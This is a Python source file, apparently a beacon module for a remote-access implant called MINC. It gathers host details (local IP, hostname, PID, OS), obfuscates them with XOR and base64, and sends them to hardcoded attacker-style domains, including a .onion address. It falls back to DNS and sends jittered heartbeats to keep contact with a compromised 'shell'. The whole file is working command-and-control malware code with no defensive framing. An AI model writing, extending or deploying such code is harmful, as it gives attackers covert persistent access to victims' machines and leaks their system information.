# MINC - Beacon Ping Logic & Multi-Channel Presence Handler (Finalized)

import requests
import socket
import json
import random
import base64
import platform
import time
import uuid
import os

from modules.dns_fallback import beacon_dns

# === CONFIG ===
DEFAULT_BEACON_DOMAINS = [
    "http://beacon.alien-grid.net",
    "http://cdn1.alien-track.net",
    "http://darkgridcz7nkbp.onion"
]

BEACON_ENDPOINT = "/track.php"
DNS_SUFFIX = ".alien-dns.net"
XOR_KEY = "minc"

# === ENCODING / UTILITY ===
def xor_encode(data, key=XOR_KEY):
    key = key.encode() if isinstance(key, str) else key
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def encode_beacon(data):
    raw = json.dumps(data).encode()
    encrypted = xor_encode(raw)
    return base64.b64encode(encrypted).decode()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "unknown"

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "unknown"

def get_process_info():
    return {
        "pid": os.getpid(),
        "platform": platform.system(),
        "release": platform.release(),
        "python": platform.python_version()
    }

# === BEACON MAIN ===
def ping_beacon(
    shell_id,
    tags=None,
    attitude=None,
    modules=None,
    beacon_type="heartbeat",
    token=None,
    use_dns_fallback=True
):
    data = {
        "id": shell_id,
        "uuid": shell_id,
        "ip": get_local_ip(),
        "tags": tags or [],
        "platform": platform.system().lower(),
        "attitude": attitude or "unknown",
        "modules": modules or [],
        "hostname": get_hostname(),
        "pid": os.getpid(),
        "beacon": random.randint(100000, 999999),
        "beacon_type": beacon_type,
        "auth_token": token or str(uuid.uuid4())[:8],
        "timestamp": time.time(),
    }

    payload = encode_beacon(data)
    success = False

    for domain in random.sample(DEFAULT_BEACON_DOMAINS, len(DEFAULT_BEACON_DOMAINS)):
        url = f"{domain.rstrip('/')}{BEACON_ENDPOINT}"
        try:
            r = requests.post(url, data={"data": payload}, timeout=4)
            if r.status_code == 200:
                success = True
                break
        except:
            continue

    # === DNS fallback
    if not success and use_dns_fallback:
        print(f"[beacon] ❌ HTTP failed. Trying DNS fallback...")
        success = beacon_dns(shell_id, beacon_type=beacon_type, tags=tags)

    return success

# === LIVE CHECK ===
def verify_presence(shell_id, tags=None, attitude=None, modules=None):
    print(f"[beacon] Verifying presence for {shell_id}...")
    http_success = ping_beacon(
        shell_id=shell_id,
        tags=tags,
        attitude=attitude,
        modules=modules,
        beacon_type="checkin"
    )
    if http_success:
        print(f"[beacon] ✅ Shell alive via HTTP or DNS.")
        return True
    print(f"[beacon] ❌ Shell silent.")
    return False

# === LOOP MODE ===
def timed_beacon_loop(
    shell_id,
    tags=None,
    attitude=None,
    modules=None,
    interval_base=300,
    token=None
):
    while True:
        delay = interval_base + random.randint(-30, 45)
        print(f"[beacon] ⏳ Waiting {delay}s before next ping...")
        time.sleep(delay)

        print(f"[beacon] 🛰 Heartbeat ping for {shell_id}...")
        success = ping_beacon(
            shell_id=shell_id,
            tags=tags,
            attitude=attitude,
            modules=modules,
            token=token,
            beacon_type="heartbeat"
        )
        print(f"[beacon] {'✅ Success' if success else '❌ Failed'}")

